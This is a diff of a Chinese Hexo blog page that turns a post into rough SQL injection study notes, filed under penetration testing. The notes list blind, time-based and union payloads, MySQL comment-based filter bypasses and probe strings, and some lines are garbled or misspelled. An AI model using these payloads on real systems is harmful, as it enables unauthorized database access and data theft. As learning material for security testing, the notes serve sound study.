@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="安全,">
+  <meta name="keywords" content="SQL注入,">
 
 
 
@@ -86,15 +86,18 @@
 
 
 
-<meta name="keywords" content="安全">
+<meta name="description" content="SQL盲注 1’ and length(database())&amp;gt;7–+   1’ and ascii(left(database(),1))&amp;gt;122 115 s  sql mid 函数sql leftsql sleep1’ and if(ascii(left(database(),1))=115,sleep(5),1)–+ sql 注入原理SQL注入危害 数据库信息泄漏：数据库中存放的">
+<meta name="keywords" content="SQL注入">
 <meta property="og:type" content="article">
-<meta property="og:title" content="极限加固">
-<meta property="og:url" content="http://yoursite.com/2019/10/14/极限加固/index.html">
+<meta property="og:title" content="SQL注入">
+<meta property="og:url" content="http://yoursite.com/2019/10/15/SQL注入/index.html">
 <meta property="og:site_name" content="Hexo ithem">
+<meta property="og:description" content="SQL盲注 1’ and length(database())&amp;gt;7–+   1’ and ascii(left(database(),1))&amp;gt;122 115 s  sql mid 函数sql leftsql sleep1’ and if(ascii(left(database(),1))=115,sleep(5),1)–+ sql 注入原理SQL注入危害 数据库信息泄漏：数据库中存放的">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-10-14T12:48:09.698Z">
+<meta property="og:updated_time" content="2019-10-15T09:39:22.153Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="极限加固">
+<meta name="twitter:title" content="SQL注入">
+<meta name="twitter:description" content="SQL盲注 1’ and length(database())&amp;gt;7–+   1’ and ascii(left(database(),1))&amp;gt;122 115 s  sql mid 函数sql leftsql sleep1’ and if(ascii(left(database(),1))=115,sleep(5),1)–+ sql 注入原理SQL注入危害 数据库信息泄漏：数据库中存放的">
 
 
 
@@ -124,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/10/14/极限加固/">
+  <link rel="canonical" href="http://yoursite.com/2019/10/15/SQL注入/">
 
 
 
 
 
-  <title>极限加固 | Hexo ithem</title>
+  <title>SQL注入 | Hexo ithem</title>
   
 
 
@@ -267,7 +270,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/14/极限加固/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/15/SQL注入/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -284,7 +287,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">极限加固</h1>
+          <h1 class="post-title" itemprop="name headline">SQL注入</h1>
         
 
         <div class="post-meta">
@@ -296,8 +299,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-14T18:41:37+08:00">
-                2019-10-14
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-15T11:24:57+08:00">
+                2019-10-15
               </time>
             
 
@@ -306,6 +309,28 @@
             
           </span>
 
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -334,7 +359,94 @@
       
 
       
-        
+        <h2 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h2><blockquote>
+<p>1’ and length(database())&gt;7–+</p>
+</blockquote>
+<blockquote>
+<p>1’ and ascii(left(database(),1))&gt;122 115 s</p>
+</blockquote>
+<h3 id="sql-mid-函数"><a href="#sql-mid-函数" class="headerlink" title="sql mid 函数"></a>sql mid 函数</h3><p>sql left<br>sql sleep<br>1’ and if(ascii(left(database(),1))=115,sleep(5),1)–+</p>
+<h3 id="sql-注入原理"><a href="#sql-注入原理" class="headerlink" title="sql 注入原理"></a>sql 注入原理</h3><h3 id="SQL注入危害"><a href="#SQL注入危害" class="headerlink" title="SQL注入危害"></a>SQL注入危害</h3><ol>
+<li>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。<br>网页篡改：通过操作数据库对特定网页进行篡改。<br>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。<br>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。<br>服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。<br>破坏硬盘数据，瘫痪全系统。<br>一些类型的数据库系统能够让SQL指令操作文件系统，这使得SQL注入的危害被进一步放大</li>
+</ol>
+<h3 id="sql-注入分类"><a href="#sql-注入分类" class="headerlink" title="sql 注入分类"></a>sql 注入分类</h3><ul>
+<li><ol>
+<li>注入点类型 数值型 字符型</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>注入点位置（get注入，post注入，cookie注入，搜索型注入，http头注入）</li>
+</ol>
+</li>
+<li><ol start="3">
+<li>页面回显（报错注入，布尔盲注，时间盲注）</li>
+</ol>
+</li>
+<li><ol>
+<li>按照页面有无回显。<h3 id="sql-注入的位置"><a href="#sql-注入的位置" class="headerlink" title="sql 注入的位置"></a>sql 注入的位置</h3></li>
+</ol>
+</li>
+<li><p>登录框  </p>
+</li>
+<li><p>搜索框 </p>
+</li>
+<li><p>url参数值get </p>
+</li>
+<li><p>url参数值post </p>
+</li>
+<li><p>信息设置</p>
+</li>
+</ul>
+<h3 id="sql注入判断依据"><a href="#sql注入判断依据" class="headerlink" title="sql注入判断依据"></a>sql注入判断依据</h3><ul>
+<li>sql注入漏洞挖掘方式   </li>
+<li>使用工具safe3wvs webCruiser appscan awvs  手工测试</li>
+<li>value+0 -0 *1 /1</li>
+<li>1 or 1=1    1)or(1=1</li>
+<li>数字型——内联sql注入</li>
+</ul>
+<h3 id="测试语句"><a href="#测试语句" class="headerlink" title="测试语句"></a>测试语句</h3><ul>
+<li><p>数字型 字符型</p>
+</li>
+<li><p>and 1=1/and 1=2 and ‘1’=’1 and ‘1’=’2<br>…..</p>
+</li>
+<li><p>数据库的比较运算符  1&lt;2 真  2&lt;1 假   数字 数字</p>
+</li>
+<li><p>数字 与字符 串   1’ and’nima’&gt;’0  存在  1’ and’nima’=’0  1’ and’nima’=’1 不存在</p>
+</li>
+<li><p>字符串 与 字符串 比较    a 97  65 A  ‘a’&lt;’b’   1’ and’nima’=’nima</p>
+<h3 id="数据库注释"><a href="#数据库注释" class="headerlink" title="数据库注释"></a>数据库注释</h3></li>
+<li><input checked disabled type="checkbox"> <p>sql server和oracle  </p>
+</li>
+</ul>
+<ol>
+<li>–</li>
+<li>/* */</li>
+</ol>
+<ul>
+<li><input checked disabled type="checkbox"> mysql</li>
+<li>/*  */ – #</li>
+<li>1’ or 1=1 order by 3– </li>
+<li>1’ union select 1,1#</li>
+<li>1’/<em>!union</em>/ /<em>!select <em>/ 1,1#  注释非 /</em>！</em>/</li>
+<li>1’ /<em>!5553,union</em>//*!5553,select */1,1#</li>
+<li>access sqlite asp</li>
+<li>mssql mysql oracle php jsp</li>
+<li>and (select count(*) from jishi)&gt;0</li>
+<li>len(url)  asc(mid(bianliang,3,1))</li>
+<li>sql mid</li>
+<li>sleep()</li>
+<li>benchmark()禁止使用</li>
+<li>select benchmark <h3 id="MYSQL延迟注入"><a href="#MYSQL延迟注入" class="headerlink" title="MYSQL延迟注入"></a>MYSQL延迟注入</h3></li>
+<li>延迟注入是通过页面返回的时间来判断的</li>
+<li>不同的mysql数据库版本延迟注入的语句也不同</li>
+<li>mysql &gt;= 5.0 的可以使用sleep()进行查询</li>
+<li>mysql &lt; 5.0 可以使用benchmark()进行查询</li>
+<li>benchark()的用法</li>
+<li>benchark(n,sql语句)n为查询次数</li>
+<li>通常查询时间的增多返回时间变得缓慢来判断是否存在延迟注入</li>
+<li>select benchark(1000,select * from admin)</li>
+</ul>
+
       
     </div>
     
@@ -351,7 +463,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/安全/" rel="tag"><i class="fa fa-tag"></i> 安全</a>
+            <a href="/tags/SQL注入/" rel="tag"><i class="fa fa-tag"></i> SQL注入</a>
           
         </div>
       
@@ -364,8 +476,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/10/14/my-first-blog(1)/" rel="next" title="my-first-blog">
-                <i class="fa fa-chevron-left"></i> my-first-blog
+              <a href="/2019/10/14/渗透测试/" rel="next" title="渗透测试">
+                <i class="fa fa-chevron-left"></i> 渗透测试
               </a>
             
           </div>
@@ -373,10 +485,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/10/14/应急响应/" rel="prev" title="应急响应">
-                应急响应 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -437,8 +545,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -498,6 +615,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL盲注"><span class="nav-number">1.</span> <span class="nav-text">SQL盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sql-mid-函数"><span class="nav-number">1.1.</span> <span class="nav-text">sql mid 函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql-注入原理"><span class="nav-number">1.2.</span> <span class="nav-text">sql 注入原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入危害"><span class="nav-number">1.3.</span> <span class="nav-text">SQL注入危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql-注入分类"><span class="nav-number">1.4.</span> <span class="nav-text">sql 注入分类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql-注入的位置"><span class="nav-number">1.5.</span> <span class="nav-text">sql 注入的位置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql注入判断依据"><span class="nav-number">1.6.</span> <span class="nav-text">sql注入判断依据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#测试语句"><span class="nav-number">1.7.</span> <span class="nav-text">测试语句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#数据库注释"><span class="nav-number">1.8.</span> <span class="nav-text">数据库注释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MYSQL延迟注入"><span class="nav-number">1.9.</span> <span class="nav-text">MYSQL延迟注入</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
